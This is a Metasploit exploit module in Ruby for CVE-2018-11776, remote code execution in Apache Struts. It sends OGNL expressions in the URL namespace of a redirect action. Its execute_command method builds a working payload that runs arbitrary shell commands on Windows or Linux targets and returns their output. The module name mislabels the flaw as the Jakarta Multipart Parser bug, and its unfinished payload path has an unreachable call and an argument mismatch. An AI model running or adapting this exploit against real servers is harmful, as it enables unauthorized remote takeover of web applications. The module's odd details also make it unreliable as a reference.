##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager   # https://github.com/rapid7/metasploit-framework/wiki/How-to-use-command-stagers

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts Jakarta Multipart Parser OGNL Injection',
      'Description'    => %q{
        This module exploits a remote code execution vulnerability in Apache Struts
        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed
        via an endpoint that makes use of a redirect action.

        Native payloads will be converted to executables and dropped in the
        server's temp dir. If this fails, try a cmd/* payload, which won't
        have to write to the disk.
      },
      'Author'         => [
        'Man Yue Mo', # Discovery
        'hook-s3c',   # PoC
        'asoto-r7',   # Metasploit module
        'wvu-r7'      # Metasploit module
      ],
      'References'     => [
        ['CVE', '2018-11776'],
        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2018-11776'],
        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-057']
      ],
      'Privileged'     => true,
      'Targets'        => [
        [
          'Universal', {
            'Platform'   => %w{ unix windows linux },
            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
      ],
      'DisclosureDate' => 'Apr 10 2018',
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),
          OptString.new('ACTION', [ true, 'A valid endpoint that is configured as a redirect action', 'showcase.action' ])
        ]
      )
      register_advanced_options(
        [
          OptString.new('HTTPMethod', [ true, 'The HTTP method to send in the request. Cannot contain spaces', 'GET' ])
        ]
      )
  end

  def check
    # Generate two random numbers, ask the target to add them together.
    #   If it does, it's vulnerable.
    a = rand(10000)
    b = rand(10000)
    c = a+b

    ognl = "#{a}+#{b}"

    begin
      resp = send_struts_request(ognl)
    rescue Msf::Exploit::Failed => error
      print_error(error.to_s)
      return Exploit::CheckCode::Unknown
    end

    # If vulnerable, the server should return an HTTP 302 (Redirect)
    #   and the 'Location' header should contain the sum of our two numbers (a+b)
    if resp && resp.code == 302 && (resp.headers['Location'].include?c.to_s)
      vprint_status("Submitted OGNL: #{ognl}")
      vprint_status("Redirected to:  #{resp.headers['Location']}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    case payload.arch.first
    when ARCH_CMD
      resp = execute_command(payload.encoded)
    else
      fail_with(Failure::BadConfig,"Only cmd payloads are currently supported.")
      resp = send_payload()
    end
  end

  def send_struts_request(ognl)
    uri = normalize_uri("/${#{ognl}}/",datastore['ACTION'])

    resp = send_request_cgi(
      'encode'  => true,
      'uri'     => uri,
      'method'  => datastore['HTTPMethod']
    )

    if resp && resp.code == 404
      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI and ACTION')
    end
    resp
  end

  def execute_command(cmd_input)
    # The following OGNL will run arbitrary commands on Windows and Linux
    #   targets, as well as returning STDOUT and STDERR.
    #   In my testing, the request timed out after 3 seconds.
    ognl = "(#_memberAccess['allowStaticMethodAccess']=true)."
    ognl << "(#cmd='" + cmd_input + "')."
    ognl << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    ognl << "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
    ognl << "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl << "(#p.redirectErrorStream(true))."
    ognl << "(#process=#p.start())."
    ognl << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl << "(#ros.flush())"

    vprint_status("Submitted OGNL: #{ognl}")

    resp = send_struts_request(ognl)

    if resp && resp.code == 200
      print_status("Command ran.  Output from command:\n#{resp.body}")
    else
      print_error("Failed to run command.  Response from server: #{resp.to_s}")
    end
  end

  def send_payload(exe)
    # TODO: Have the ability to upload/run payloads

    # send_struts_request(ognl)
  end
end
